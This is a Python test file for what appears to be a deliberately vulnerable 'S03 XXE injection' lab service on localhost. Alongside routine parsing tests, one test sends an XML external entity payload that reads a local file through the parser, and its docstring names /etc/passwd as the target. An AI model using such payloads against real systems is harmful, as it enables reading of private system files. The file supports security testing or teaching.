"""Tests for S03 XXE injection scenario."""

import httpx

BASE = "http://127.0.0.1:8000"


def test_health():
    r = httpx.get(f"{BASE}/health")
    assert r.status_code == 200
    assert r.json()["status"] == "ok"


def test_parse_normal_xml():
    xml = b"<root><name>test</name></root>"
    r = httpx.post(f"{BASE}/parse", content=xml)
    assert r.status_code == 200
    data = r.json()
    assert "parsed" in data
    assert "test" in data["parsed"]


def test_parse_empty():
    r = httpx.post(f"{BASE}/parse", content=b"")
    assert r.status_code == 200
    assert "error" in r.json()


def test_parse_invalid_xml():
    r = httpx.post(f"{BASE}/parse", content=b"not xml at all")
    assert r.status_code == 200
    assert "error" in r.json()


def test_xxe_file_read():
    """XXE payload to read /etc/passwd — proves entity expansion."""
    # Create a marker file to prove file read works
    import os

    marker_path = "/tmp/xxe_test_marker"
    with open(marker_path, "w") as f:
        f.write("xxe_proof")

    xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{marker_path}">
]>
<root>&xxe;</root>""".encode()

    r = httpx.post(f"{BASE}/parse", content=xml)
    assert r.status_code == 200
    data = r.json()
    assert "parsed" in data
    assert "xxe_proof" in data["parsed"]
    os.remove(marker_path)
